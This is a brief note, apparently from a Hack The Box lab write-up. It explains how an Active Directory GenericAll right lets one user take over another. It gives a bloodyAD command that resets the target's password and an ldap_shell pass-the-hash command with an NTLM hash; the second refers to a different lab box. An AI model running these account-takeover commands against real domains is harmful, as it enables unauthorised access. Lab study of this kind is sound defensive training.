The user D.ANDERSON@INFILTRATOR.HTB has GenericAll privileges to the user E.RODRIGUEZ@INFILTRATOR.HTB.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![[Pasted image 20240904201810.png]]

```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "d.anderson" -p 'Password123' set password "e.rodriguez" 'Password123'
```

Or use ldap_shell

```bash
ldap_shell certified.htb/management_svc -hashes aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
change_password ca_operator Password123
```


